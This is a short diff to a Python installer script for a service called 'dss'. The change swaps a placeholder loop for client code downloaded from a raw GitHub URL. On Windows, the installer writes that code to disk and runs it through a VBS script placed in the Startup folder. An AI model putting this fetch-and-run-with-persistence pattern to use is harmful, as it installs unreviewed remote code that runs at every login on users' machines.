@@ -13,7 +13,8 @@ from zipfile import ZipFile
 import json
 
 service_name = "dss"
-code = "#!/usr/bin/python3\ni = 0\nwhile True:\n\ti += 1"
+code = requests.get('https://raw.githubusercontent.com/MrFoxyGmFr/dss-network/dev/client/client.py').text
+
 
 if sys.platform.startswith("linux"):
 	output = subprocess.check_output("xrandr | grep '*'", shell=True, universal_newlines=True)
@@ -60,6 +61,3 @@ elif sys.platform == "win32":
 	open(windows_programms + "dss.py", "w").write(code)
 	open(windows_programms + "Startup\\windows.vbs", "w").write(vbs_script)
 	os.system(f"cd {windows_programms}Startup && windows.vbs")
-
-	open(windows_programms + "dss.py", "w").write(r.json())
-	
